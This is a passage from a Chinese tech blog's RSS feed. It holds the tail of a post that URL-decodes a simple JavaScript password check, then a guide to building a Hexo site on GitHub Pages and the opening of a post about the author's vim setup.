style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%61%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%36%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;34&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%38%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%66%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;36&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%65%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%37%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%37%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%31%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;34&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%66%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%22%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print urllib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unquote(a&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;b)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到代码如下：&lt;/p&gt;</description>
    </item>
    <item>
      <title>使用hexo和github搭建网站</title>
      <link>https://dragonbox.top/posts/tech-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</link>
      <pubDate>Mon, 22 Apr 2019 03:12:31 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</guid>
      <description>&lt;h2 id=&#34;基础修改&#34;&gt;基础修改&lt;/h2&gt;
&lt;p&gt;修改 _config.yml，写上网站的标题&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;title:
subtitle:
description:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;选择主题&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;theme: next
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;hexo-插件&#34;&gt;hexo 插件&lt;/h2&gt;
&lt;h3 id=&#34;字数统计和阅读时长统计&#34;&gt;字数统计和阅读时长统计&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/theme-next/hexo-symbols-count-time&#34;&gt;https://github.com/theme-next/hexo-symbols-count-time&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 _config.yml 中添加&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;symbols_count_time:
  symbols: true
  time: true
  total_symbols: true
  total_time: true
  exclude_codeblock: false
  awl: 4
  wpm: 275
  suffix: &amp;#34;mins.&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在Next主题中的 _config.yml中添加&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;symbols_count_time:
  separated_meta: true
  item_text_post: true
  item_text_total: true
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;git-部署&#34;&gt;git 部署&lt;/h3&gt;
&lt;p&gt;在你的github账户上创建仓库&lt;code&gt;yourusername.github.io&lt;/code&gt;，必须是用户名开头命名，否则&lt;code&gt;github page&lt;/code&gt;不会生效。&lt;/p&gt;
&lt;p&gt;首先生成个人公私钥&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd
ssh-keygen -t rsa -C &amp;#34;your_email@example.com&amp;#34;
然后将公钥粘贴进github账户的个人设置里面
ssh -T git@github.com
git config --global user.name &amp;#34;username&amp;#34;
git config --global user.email &amp;#34;email&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在博客目录下下载：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;npm install hexo-deployer-git --save
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改网站根目录下的_config.yml文件&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;deploy:
  - type: git#注意git的前面要加空格否则不生效
  	repo: https://github.com/example/example.github.io.git
  	branch: master
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;保存退出后执行命令：&lt;/p&gt;</description>
    </item>
    <item>
      <title>ch3n9w 的 vim</title>
      <link>https://dragonbox.top/posts/tech-ch4ser-vim/</link>
      <pubDate>Mon, 22 Apr 2019 02:05:35 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-ch4ser-vim/</guid>
      <description>&lt;h1 id=&#34;ch3n9w-的-vim&#34;&gt;ch3n9w 的 vim&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;本篇文章中的插件均已过时, 不推荐使用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;《程序员修炼之道》中有一句话:&lt;code&gt;最好是精通一种编辑器，并将其用于所有编辑任务。如果不坚持使用一种编辑器，可能会面临现代的巴别特大混乱。&lt;/code&gt; ，实质今日，深以为然。而自从接触vim之后我一直都保持着有空折腾折腾的好习惯，它的简洁和高度自由让人着迷，围绕着vim衍生出的插件数不胜数。奈何插件繁多的同时也意味着选择的困难和配置的繁琐。为了准备以后可能出现的突发情况比如配置丢失或者重新安装，特在此以实现特定功能为主题，记录自己配置vim的过程。&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
